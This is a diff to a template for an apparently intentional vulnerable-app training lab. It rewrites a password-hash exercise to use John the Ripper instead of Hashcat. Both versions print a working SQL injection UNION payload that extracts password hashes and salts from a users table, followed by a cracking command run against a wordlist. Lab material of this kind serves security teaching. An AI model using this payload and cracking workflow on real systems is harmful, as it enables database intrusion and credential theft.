@@ -18,13 +18,16 @@
 
     <h2>Password Hash Exercise</h2>
     <p>
-        In unsafe mode, try retrieving hashes with
-        <code>' UNION SELECT id, password_hash || ':' || salt FROM users-- </code>.
-        This lab uses SHA-256 with a known fixed lab salt. Save the returned
-        <code>hash:salt</code> value on its own line in <code>hashes.txt</code>,
-        then run Hashcat mode 1420 with a wordlist:
+        In unsafe mode, retrieve password hashes in John the Ripper's dynamic
+        format for SHA256(salt + password):
     </p>
-    <pre>hashcat -m 1420 hashes.txt /path/to/wordlist.txt</pre>
+    <pre>' UNION SELECT id, '$dynamic_61$' || password_hash || '$' || salt FROM users-- </pre>
+    <p>
+        Save each returned value from Column 2 on its own line in
+        <code>hashes-john.txt</code>, then run John with the included lab wordlist:
+    </p>
+    <pre>john --format=dynamic_61 --wordlist=pentest/password_wordlist4john.txt hashes-john.txt</pre>
+    <p>The seeded user's password is included in that wordlist.</p>
 
     {% if query %}
         <h2>Executed Query</h2>
